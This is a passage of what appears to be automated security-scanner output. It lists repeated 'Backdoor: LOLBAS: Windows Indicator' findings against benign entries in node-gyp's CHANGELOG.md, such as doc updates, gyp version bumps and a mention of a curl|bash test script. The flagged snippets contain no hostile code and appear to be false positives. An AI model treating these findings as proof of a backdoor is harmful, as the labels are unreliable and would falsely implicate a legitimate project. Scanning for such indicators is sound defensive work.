                    "text": "odejs/node-gyp/pull/2135)\n* [[`7b75af349b`](https://github.com/nodejs/node-gyp/commit/7b75af349b)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`4f23c7bee2`](https://github.com/nodejs/node-gyp/commit/4f23c7bee2)] - **doc**: update link to the code of conduct (#2073) (Michaël Zasso) [#2073](https://github.com/nodejs/node-gyp/pull/2073)\n* [[`473cfa283f`](https://github.com/nodejs/node-gyp/commit/473cfa283f)] - **doc**: note in README that Python 3.8 is supported (#2072) (Michaël Zasso) [#2072](https://github.com/nodejs/node-gyp",
                    "rendered": {
                      "text": "odejs/node-gyp/pull/2135)\n* [[`7b75af349b`](https://github.com/nodejs/node-gyp/commit/7b75af349b)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`4f23c7bee2`](https://github.com/nodejs/node-gyp/commit/4f23c7bee2)] - **doc**: update link to the code of conduct (#2073) (Michaël Zasso) [#2073](https://github.com/nodejs/node-gyp/pull/2073)\n* [[`473cfa283f`](https://github.com/nodejs/node-gyp/commit/473cfa283f)] - **doc**: note in README that Python 3.8 is supported (#2072) (Michaël Zasso) [#2072](https://github.com/nodejs/node-gyp",
                      "markdown": "`odejs/node-gyp/pull/2135)\n* [[`7b75af349b`](https://github.com/nodejs/node-gyp/commit/7b75af349b)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`4f23c7bee2`](https://github.com/nodejs/node-gyp/commit/4f23c7bee2)] - **doc**: update link to the code of conduct (#2073) (Michaël Zasso) [#2073](https://github.com/nodejs/node-gyp/pull/2073)\n* [[`473cfa283f`](https://github.com/nodejs/node-gyp/commit/473cfa283f)] - **doc**: note in README that Python 3.8 is supported (#2072) (Michaël Zasso) [#2072](https://github.com/nodejs/node-gyp`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 524,
                  "startColumn": 111,
                  "endLine": 524,
                  "endColumn": 119,
                  "snippet": {
                    "text": "tps://github.com/nodejs/node-gyp/commit/963f2a7b48)] - **doc**: improve Catalina discoverability for search engines (Matheus Marchini) [#2135](https://github.com/nodejs/node-gyp/pull/2135)\n* [[`7b75af349b`](https://github.com/nodejs/node-gyp/commit/7b75af349b)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`4f23c7bee2`](https://github.com/nodejs/node-gyp/commit/4f23c7bee2)] - **doc**: update link to the code of conduct (#2073) (Michaël Zasso) [#2073](https://github.com/nodejs/node-gyp/pull/2073)\n* [[`473cfa283f`](https://githu",
                    "rendered": {
                      "text": "tps://github.com/nodejs/node-gyp/commit/963f2a7b48)] - **doc**: improve Catalina discoverability for search engines (Matheus Marchini) [#2135](https://github.com/nodejs/node-gyp/pull/2135)\n* [[`7b75af349b`](https://github.com/nodejs/node-gyp/commit/7b75af349b)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`4f23c7bee2`](https://github.com/nodejs/node-gyp/commit/4f23c7bee2)] - **doc**: update link to the code of conduct (#2073) (Michaël Zasso) [#2073](https://github.com/nodejs/node-gyp/pull/2073)\n* [[`473cfa283f`](https://githu",
                      "markdown": "`tps://github.com/nodejs/node-gyp/commit/963f2a7b48)] - **doc**: improve Catalina discoverability for search engines (Matheus Marchini) [#2135](https://github.com/nodejs/node-gyp/pull/2135)\n* [[`7b75af349b`](https://github.com/nodejs/node-gyp/commit/7b75af349b)] - **doc**: add macOS Catalina software update info (Karl Horky) [#2078](https://github.com/nodejs/node-gyp/pull/2078)\n* [[`4f23c7bee2`](https://github.com/nodejs/node-gyp/commit/4f23c7bee2)] - **doc**: update link to the code of conduct (#2073) (Michaël Zasso) [#2073](https://github.com/nodejs/node-gyp/pull/2073)\n* [[`473cfa283f`](https://githu`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 521,
                  "startColumn": 83,
                  "endLine": 521,
                  "endColumn": 91,
                  "snippet": {
                    "text": "ll/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp/pull/2105)\n* [[`e529f3309d`](https://github.com/nodejs/node-gyp/commit/e529f3309d)] - **doc**: update README to reflect upgrade to gyp-next (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`9aed6286a3`](https://github.com/nodejs/node-gyp/commit/9aed6286a3)] - **doc**: give more attention to Catalina issues doc (Matheus Marchini) [#2134](https://github.com/nodejs/node-gyp/pul",
                    "rendered": {
                      "text": "ll/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp/pull/2105)\n* [[`e529f3309d`](https://github.com/nodejs/node-gyp/commit/e529f3309d)] - **doc**: update README to reflect upgrade to gyp-next (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`9aed6286a3`](https://github.com/nodejs/node-gyp/commit/9aed6286a3)] - **doc**: give more attention to Catalina issues doc (Matheus Marchini) [#2134](https://github.com/nodejs/node-gyp/pul",
                      "markdown": "`ll/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp/pull/2105)\n* [[`e529f3309d`](https://github.com/nodejs/node-gyp/commit/e529f3309d)] - **doc**: update README to reflect upgrade to gyp-next (Ujjwal Sharma) [#2092](https://github.com/nodejs/node-gyp/pull/2092)\n* [[`9aed6286a3`](https://github.com/nodejs/node-gyp/commit/9aed6286a3)] - **doc**: give more attention to Catalina issues doc (Matheus Marchini) [#2134](https://github.com/nodejs/node-gyp/pul`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 520,
                  "startColumn": 83,
                  "endLine": 520,
                  "endColumn": 91,
                  "snippet": {
                    "text": "s/node-gyp/pull/2126)\n* [[`ba4f34b7d6`](https://github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp/pull/2105)\n* [[`e529f3309d`](https://github.com/nodejs/node-gyp/commit/e529f3309d)] - **doc**: update README to reflect upgrade to gyp-next (Ujjwal Sharma) [#2092](https://github.com/nodejs/node",
                    "rendered": {
                      "text": "s/node-gyp/pull/2126)\n* [[`ba4f34b7d6`](https://github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp/pull/2105)\n* [[`e529f3309d`](https://github.com/nodejs/node-gyp/commit/e529f3309d)] - **doc**: update README to reflect upgrade to gyp-next (Ujjwal Sharma) [#2092](https://github.com/nodejs/node",
                      "markdown": "`s/node-gyp/pull/2126)\n* [[`ba4f34b7d6`](https://github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp/pull/2105)\n* [[`e529f3309d`](https://github.com/nodejs/node-gyp/commit/e529f3309d)] - **doc**: update README to reflect upgrade to gyp-next (Ujjwal Sharma) [#2092](https://github.com/nodejs/node`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 519,
                  "startColumn": 83,
                  "endLine": 519,
                  "endColumn": 91,
                  "snippet": {
                    "text": "node-gyp/pull/2123)\n* [[`d45438a047`](https://github.com/nodejs/node-gyp/commit/d45438a047)] - **(SEMVER-MAJOR)** **deps**: update deps, match to npm@7 (Rod Vagg) [#2126](https://github.com/nodejs/node-gyp/pull/2126)\n* [[`ba4f34b7d6`](https://github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp",
                    "rendered": {
                      "text": "node-gyp/pull/2123)\n* [[`d45438a047`](https://github.com/nodejs/node-gyp/commit/d45438a047)] - **(SEMVER-MAJOR)** **deps**: update deps, match to npm@7 (Rod Vagg) [#2126](https://github.com/nodejs/node-gyp/pull/2126)\n* [[`ba4f34b7d6`](https://github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp",
                      "markdown": "`node-gyp/pull/2123)\n* [[`d45438a047`](https://github.com/nodejs/node-gyp/commit/d45438a047)] - **(SEMVER-MAJOR)** **deps**: update deps, match to npm@7 (Rod Vagg) [#2126](https://github.com/nodejs/node-gyp/pull/2126)\n* [[`ba4f34b7d6`](https://github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](https://github.com/nodejs/node-gyp/commit/f7bfce96ed)] - **doc**: update acid test and introduce curl|bash test script (Dario Vladovic) [#2105](https://github.com/nodejs/node-gyp`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 518,
                  "startColumn": 103,
                  "endLine": 518,
                  "endColumn": 111,
                  "snippet": {
                    "text": "22cf5`](https://github.com/nodejs/node-gyp/commit/4937722cf5)] - **(SEMVER-MAJOR)** **deps**: replace mkdirp with {recursive} mkdir (Rod Vagg) [#2123](https://github.com/nodejs/node-gyp/pull/2123)\n* [[`d45438a047`](https://github.com/nodejs/node-gyp/commit/d45438a047)] - **(SEMVER-MAJOR)** **deps**: update deps, match to npm@7 (Rod Vagg) [#2126](https://github.com/nodejs/node-gyp/pull/2126)\n* [[`ba4f34b7d6`](https://github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](h",
                    "rendered": {
                      "text": "22cf5`](https://github.com/nodejs/node-gyp/commit/4937722cf5)] - **(SEMVER-MAJOR)** **deps**: replace mkdirp with {recursive} mkdir (Rod Vagg) [#2123](https://github.com/nodejs/node-gyp/pull/2123)\n* [[`d45438a047`](https://github.com/nodejs/node-gyp/commit/d45438a047)] - **(SEMVER-MAJOR)** **deps**: update deps, match to npm@7 (Rod Vagg) [#2126](https://github.com/nodejs/node-gyp/pull/2126)\n* [[`ba4f34b7d6`](https://github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](h",
                      "markdown": "`22cf5`](https://github.com/nodejs/node-gyp/commit/4937722cf5)] - **(SEMVER-MAJOR)** **deps**: replace mkdirp with {recursive} mkdir (Rod Vagg) [#2123](https://github.com/nodejs/node-gyp/pull/2123)\n* [[`d45438a047`](https://github.com/nodejs/node-gyp/commit/d45438a047)] - **(SEMVER-MAJOR)** **deps**: update deps, match to npm@7 (Rod Vagg) [#2126](https://github.com/nodejs/node-gyp/pull/2126)\n* [[`ba4f34b7d6`](https://github.com/nodejs/node-gyp/commit/ba4f34b7d6)] - **doc**: update catalina xcode clt download link (Dario Vladovic) [#2133](https://github.com/nodejs/node-gyp/pull/2133)\n* [[`f7bfce96ed`](h`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 508,
                  "startColumn": 104,
                  "endLine": 508,
                  "endColumn": 112,
                  "snippet": {
                    "text": "7.1.0 2020-08-12\n\n* [[`aaf33c3029`](https://github.com/nodejs/node-gyp/commit/aaf33c3029)] - **build**: add update-gyp script (Samuel Attard) [#2167](https://github.com/nodejs/node-gyp/pull/2167)\n* * [[`3baa4e4172`](https://github.com/nodejs/node-gyp/commit/3baa4e4172)] - **(SEMVER-MINOR)** **gyp**: update gyp to 0.4.0 (Samuel Attard) [#2165](https://github.com/nodejs/node-gyp/pull/2165)\n* * [[`f461d56c53`](https://github.com/nodejs/node-gyp/commit/f461d56c53)] - **(SEMVER-MINOR)** **build**: support apple silicon (arm64 darwin) builds (Samuel Attard) [#2165](https://github.com/nodejs/node-gyp/pull/21",
                    "rendered": {
                      "text": "7.1.0 2020-08-12\n\n* [[`aaf33c3029`](https://github.com/nodejs/node-gyp/commit/aaf33c3029)] - **build**: add update-gyp script (Samuel Attard) [#2167](https://github.com/nodejs/node-gyp/pull/2167)\n* * [[`3baa4e4172`](https://github.com/nodejs/node-gyp/commit/3baa4e4172)] - **(SEMVER-MINOR)** **gyp**: update gyp to 0.4.0 (Samuel Attard) [#2165](https://github.com/nodejs/node-gyp/pull/2165)\n* * [[`f461d56c53`](https://github.com/nodejs/node-gyp/commit/f461d56c53)] - **(SEMVER-MINOR)** **build**: support apple silicon (arm64 darwin) builds (Samuel Attard) [#2165](https://github.com/nodejs/node-gyp/pull/21",
                      "markdown": "`7.1.0 2020-08-12\n\n* [[`aaf33c3029`](https://github.com/nodejs/node-gyp/commit/aaf33c3029)] - **build**: add update-gyp script (Samuel Attard) [#2167](https://github.com/nodejs/node-gyp/pull/2167)\n* * [[`3baa4e4172`](https://github.com/nodejs/node-gyp/commit/3baa4e4172)] - **(SEMVER-MINOR)** **gyp**: update gyp to 0.4.0 (Samuel Attard) [#2165](https://github.com/nodejs/node-gyp/pull/2165)\n* * [[`f461d56c53`](https://github.com/nodejs/node-gyp/commit/f461d56c53)] - **(SEMVER-MINOR)** **build**: support apple silicon (arm64 darwin) builds (Samuel Attard) [#2165](https://github.com/nodejs/node-gyp/pull/21`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 498,
                  "startColumn": 83,
                  "endLine": 498,
                  "endColumn": 91,
                  "snippet": {
                    "text": "g-fix rather than semver-major change.\n\n* [[`18bf2d1d38`](https://github.com/nodejs/node-gyp/commit/18bf2d1d38)] - **deps**: update deps to match npm@7 (Rod Vagg) [#2240](https://github.com/nodejs/node-gyp/pull/2240)\n* [[`ee6a837cb7`](https://github.com/nodejs/node-gyp/commit/ee6a837cb7)] - **gyp**: update gyp to 0.6.1 (Rod Vagg) [#2238](https://github.com/nodejs/node-gyp/pull/2238)\n* [[`3e7f8ccafc`](https://github.com/nodejs/node-gyp/commit/3e7f8ccafc)] - **lib**: better log message when ps fails (Martin Midtgaard) [#2229](https://github.com/nodejs/node-gyp/pull/2229)\n* [[`7fb314339f`](https://github",
                    "rendered": {
                      "text": "g-fix rather than semver-major change.\n\n* [[`18bf2d1d38`](https://github.com/nodejs/node-gyp/commit/18bf2d1d38)] - **deps**: update deps to match npm@7 (Rod Vagg) [#2240](https://github.com/nodejs/node-gyp/pull/2240)\n* [[`ee6a837cb7`](https://github.com/nodejs/node-gyp/commit/ee6a837cb7)] - **gyp**: update gyp to 0.6.1 (Rod Vagg) [#2238](https://github.com/nodejs/node-gyp/pull/2238)\n* [[`3e7f8ccafc`](https://github.com/nodejs/node-gyp/commit/3e7f8ccafc)] - **lib**: better log message when ps fails (Martin Midtgaard) [#2229](https://github.com/nodejs/node-gyp/pull/2229)\n* [[`7fb314339f`](https://github",
                      "markdown": "`g-fix rather than semver-major change.\n\n* [[`18bf2d1d38`](https://github.com/nodejs/node-gyp/commit/18bf2d1d38)] - **deps**: update deps to match npm@7 (Rod Vagg) [#2240](https://github.com/nodejs/node-gyp/pull/2240)\n* [[`ee6a837cb7`](https://github.com/nodejs/node-gyp/commit/ee6a837cb7)] - **gyp**: update gyp to 0.6.1 (Rod Vagg) [#2238](https://github.com/nodejs/node-gyp/pull/2238)\n* [[`3e7f8ccafc`](https://github.com/nodejs/node-gyp/commit/3e7f8ccafc)] - **lib**: better log message when ps fails (Martin Midtgaard) [#2229](https://github.com/nodejs/node-gyp/pull/2229)\n* [[`7fb314339f`](https://github`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 497,
                  "startColumn": 84,
                  "endLine": 497,
                  "endColumn": 92,
                  "snippet": {
                    "text": "ug} directory for\nbuilds using `make` (Linux, etc.). This is inconsistent with macOS (Xcode)\nbehavior and previous node-gyp behavior so has been reverted.\nWe consider this a bug-fix rather than semver-major change.\n\n* [[`18bf2d1d38`](https://github.com/nodejs/node-gyp/commit/18bf2d1d38)] - **deps**: update deps to match npm@7 (Rod Vagg) [#2240](https://github.com/nodejs/node-gyp/pull/2240)\n* [[`ee6a837cb7`](https://github.com/nodejs/node-gyp/commit/ee6a837cb7)] - **gyp**: update gyp to 0.6.1 (Rod Vagg) [#2238](https://github.com/nodejs/node-gyp/pull/2238)\n* [[`3e7f8ccafc`](https://github.com/nodejs/no",
                    "rendered": {
                      "text": "ug} directory for\nbuilds using `make` (Linux, etc.). This is inconsistent with macOS (Xcode)\nbehavior and previous node-gyp behavior so has been reverted.\nWe consider this a bug-fix rather than semver-major change.\n\n* [[`18bf2d1d38`](https://github.com/nodejs/node-gyp/commit/18bf2d1d38)] - **deps**: update deps to match npm@7 (Rod Vagg) [#2240](https://github.com/nodejs/node-gyp/pull/2240)\n* [[`ee6a837cb7`](https://github.com/nodejs/node-gyp/commit/ee6a837cb7)] - **gyp**: update gyp to 0.6.1 (Rod Vagg) [#2238](https://github.com/nodejs/node-gyp/pull/2238)\n* [[`3e7f8ccafc`](https://github.com/nodejs/no",
                      "markdown": "`ug} directory for\nbuilds using `make` (Linux, etc.). This is inconsistent with macOS (Xcode)\nbehavior and previous node-gyp behavior so has been reverted.\nWe consider this a bug-fix rather than semver-major change.\n\n* [[`18bf2d1d38`](https://github.com/nodejs/node-gyp/commit/18bf2d1d38)] - **deps**: update deps to match npm@7 (Rod Vagg) [#2240](https://github.com/nodejs/node-gyp/pull/2240)\n* [[`ee6a837cb7`](https://github.com/nodejs/node-gyp/commit/ee6a837cb7)] - **gyp**: update gyp to 0.6.1 (Rod Vagg) [#2238](https://github.com/nodejs/node-gyp/pull/2238)\n* [[`3e7f8ccafc`](https://github.com/nodejs/no`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 486,
                  "startColumn": 87,
                  "endLine": 486,
                  "endColumn": 92,
                  "snippet": {
                    "text": "## v7.1.2 2020-10-17\n\n* [[`096e3aded5`](https://github.com/nodejs/node-gyp/commit/096e3aded5)] - **gyp**: update gyp to 0.6.2 (Myles Borins) [#2241](https://github.com/nodejs/node-gyp/pull/2241)\n* [[`54f97cd243`](https://github.com/nodejs/node-gyp/commit/54f97cd243)] - **doc**: add cmd to reset `xcode-select` to initial state (Valera Rozuvan) [#2235](https://github.com/nodejs/node-gyp/pull/2235)\n\n## v7.1.1 2020-10-15\n\n",
                    "rendered": {
                      "text": "## v7.1.2 2020-10-17\n\n* [[`096e3aded5`](https://github.com/nodejs/node-gyp/commit/096e3aded5)] - **gyp**: update gyp to 0.6.2 (Myles Borins) [#2241](https://github.com/nodejs/node-gyp/pull/2241)\n* [[`54f97cd243`](https://github.com/nodejs/node-gyp/commit/54f97cd243)] - **doc**: add cmd to reset `xcode-select` to initial state (Valera Rozuvan) [#2235](https://github.com/nodejs/node-gyp/pull/2235)\n\n## v7.1.1 2020-10-15\n\n",
                      "markdown": "`## v7.1.2 2020-10-17\n\n* [[`096e3aded5`](https://github.com/nodejs/node-gyp/commit/096e3aded5)] - **gyp**: update gyp to 0.6.2 (Myles Borins) [#2241](https://github.com/nodejs/node-gyp/pull/2241)\n* [[`54f97cd243`](https://github.com/nodejs/node-gyp/commit/54f97cd243)] - **doc**: add cmd to reset `xcode-select` to initial state (Valera Rozuvan) [#2235](https://github.com/nodejs/node-gyp/pull/2235)\n\n## v7.1.1 2020-10-15\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 485,
                  "startColumn": 83,
                  "endLine": 485,
                  "endColumn": 91,
                  "snippet": {
                    "text": "\n## v7.1.2 2020-10-17\n\n* [[`096e3aded5`](https://github.com/nodejs/node-gyp/commit/096e3aded5)] - **gyp**: update gyp to 0.6.2 (Myles Borins) [#2241](https://github.com/nodejs/node-gyp/pull/2241)\n* [[`54f97cd243`](https://github.com/nodejs/node-gyp/commit/54f97cd243)] - **doc**: add cmd to reset `xcode-select` to initial state (Valera Rozuvan) [#2235](https://github.com/nodejs/node-gyp/pull/2235)\n\n## v7.1.1 2020-10-15\n",
                    "rendered": {
                      "text": "\n## v7.1.2 2020-10-17\n\n* [[`096e3aded5`](https://github.com/nodejs/node-gyp/commit/096e3aded5)] - **gyp**: update gyp to 0.6.2 (Myles Borins) [#2241](https://github.com/nodejs/node-gyp/pull/2241)\n* [[`54f97cd243`](https://github.com/nodejs/node-gyp/commit/54f97cd243)] - **doc**: add cmd to reset `xcode-select` to initial state (Valera Rozuvan) [#2235](https://github.com/nodejs/node-gyp/pull/2235)\n\n## v7.1.1 2020-10-15\n",
                      "markdown": "`\n## v7.1.2 2020-10-17\n\n* [[`096e3aded5`](https://github.com/nodejs/node-gyp/commit/096e3aded5)] - **gyp**: update gyp to 0.6.2 (Myles Borins) [#2241](https://github.com/nodejs/node-gyp/pull/2241)\n* [[`54f97cd243`](https://github.com/nodejs/node-gyp/commit/54f97cd243)] - **doc**: add cmd to reset `xcode-select` to initial state (Valera Rozuvan) [#2235](https://github.com/nodejs/node-gyp/pull/2235)\n\n## v7.1.1 2020-10-15\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 478,
                  "startColumn": 102,
                  "endLine": 478,
                  "endColumn": 110,
                  "snippet": {
                    "text": "/pull/2300)\n* [[`c3c510d89e`](https://github.com/nodejs/node-gyp/commit/c3c510d89e)] - **gyp**: update gyp to v0.8.0 (#2318) (Christian Clauss) [#2318](https://github.com/nodejs/node-gyp/pull/2318)\n* [[`9e1397c52e`](https://github.com/nodejs/node-gyp/commit/9e1397c52e)] - **(SEMVER-MAJOR)** **gyp**: update gyp to v0.7.0 (#2284) (Jiawen Geng) [#2284](https://github.com/nodejs/node-gyp/pull/2284)\n* [[`1bd18f3e77`](https://github.com/nodejs/node-gyp/commit/1bd18f3e77)] - **(SEMVER-MAJOR)** **lib**: drop Python 2 support in find-python.js (#2333) (DeeDeeG) [#2333](https://github.com/nodejs/node-gyp/pull/2",
                    "rendered": {
                      "text": "/pull/2300)\n* [[`c3c510d89e`](https://github.com/nodejs/node-gyp/commit/c3c510d89e)] - **gyp**: update gyp to v0.8.0 (#2318) (Christian Clauss) [#2318](https://github.com/nodejs/node-gyp/pull/2318)\n* [[`9e1397c52e`](https://github.com/nodejs/node-gyp/commit/9e1397c52e)] - **(SEMVER-MAJOR)** **gyp**: update gyp to v0.7.0 (#2284) (Jiawen Geng) [#2284](https://github.com/nodejs/node-gyp/pull/2284)\n* [[`1bd18f3e77`](https://github.com/nodejs/node-gyp/commit/1bd18f3e77)] - **(SEMVER-MAJOR)** **lib**: drop Python 2 support in find-python.js (#2333) (DeeDeeG) [#2333](https://github.com/nodejs/node-gyp/pull/2",
                      "markdown": "`/pull/2300)\n* [[`c3c510d89e`](https://github.com/nodejs/node-gyp/commit/c3c510d89e)] - **gyp**: update gyp to v0.8.0 (#2318) (Christian Clauss) [#2318](https://github.com/nodejs/node-gyp/pull/2318)\n* [[`9e1397c52e`](https://github.com/nodejs/node-gyp/commit/9e1397c52e)] - **(SEMVER-MAJOR)** **gyp**: update gyp to v0.7.0 (#2284) (Jiawen Geng) [#2284](https://github.com/nodejs/node-gyp/pull/2284)\n* [[`1bd18f3e77`](https://github.com/nodejs/node-gyp/commit/1bd18f3e77)] - **(SEMVER-MAJOR)** **lib**: drop Python 2 support in find-python.js (#2333) (DeeDeeG) [#2333](https://github.com/nodejs/node-gyp/pull/2`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
